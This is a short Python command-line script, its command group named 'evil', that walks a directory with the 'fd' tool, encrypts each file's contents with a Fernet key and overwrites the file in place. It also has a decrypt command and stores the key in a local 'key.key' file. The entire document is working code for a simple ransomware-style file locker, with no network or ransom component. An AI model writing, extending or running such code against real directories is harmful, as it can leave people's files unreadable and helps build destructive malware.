#!/usr/bin/env python3
from cryptography.fernet import Fernet 
import click
import os
import subprocess
import sys

KEY_FILE = "key.key"

def get_cipher():
    return Fernet(get_key())

def get_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

token = None 


def get_files(path):
    return subprocess.run(['fd', path], capture_output=True, text=True).stdout.splitlines()

@click.group()
def evil():
    pass

@evil.command()
@click.argument('path', type=click.Path(exists=True))
def encrypt(path):
    global token

    cipher = get_cipher()
    for file in get_files(path):
        with open(file, 'r') as f:
            content = f.read()
            token = cipher.encrypt(bytes(content, "utf-8"))
            print(token)
        with open(file, 'w') as f:
            f.write(token.decode("utf-8"));

@evil.command()
@click.argument('path', type=click.Path(exists=True))
def decrypt(path):
    global token

    cipher = get_cipher()
    for file in get_files(path):
        with open(file, 'r') as f:
            encrypted = f.read()
        with open(file, 'w') as f:
            text = cipher.decrypt(encrypted.encode("utf-8")).decode("utf-8")
            print(text)
            f.write(text)


if __name__ == "__main__":
    evil()
